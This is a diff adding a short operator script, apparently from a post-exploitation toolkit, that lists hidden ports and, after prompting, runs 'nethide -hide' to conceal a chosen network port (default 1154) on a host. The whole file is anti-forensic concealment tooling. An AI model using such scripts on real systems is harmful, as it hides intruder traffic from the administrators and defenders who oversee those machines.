@@ -1,0 +1,43 @@
+# Called from simple.eps
+
+string $portToHide="1154";
+bool $showUsage=false;
+
+if ($argc > 2) {
+    $showUsage = true;
+} 
+if ($argc >= 2) {
+	if ($argv[1] == "?") {
+	    $showUsage = true;
+	} else {
+		$portToHide=$argv[1];
+	}
+}
+
+#@record on;
+`nethide -list`;
+#@record off;
+#string $nhOutput=GetCmdData("nhOutput");
+#echo "nethide check gave this: $nhOutput";
+#int $nhPort=GetCmdData("nhPort");
+#
+#int $i=0;
+#while ($i < sizeof($nhPort)) {
+#	echo "Hidden: $nhPort[$i]";
+#	if ($nhPort[$i] == $portToHide) {
+#		echo "Your port is already hidden!";
+#		return true;
+#	}
+#	$i++;
+#}
+
+ifnot (prompt "Do you need to hide a port?") {
+	return true;
+}
+ifnot (prompt "Do you want to hide $portToHide?") {
+	$portToHide=GetInput("What port do you want to hide?");
+}
+`nethide -hide $portToHide`;
+`nethide -list`;
+
+return true;
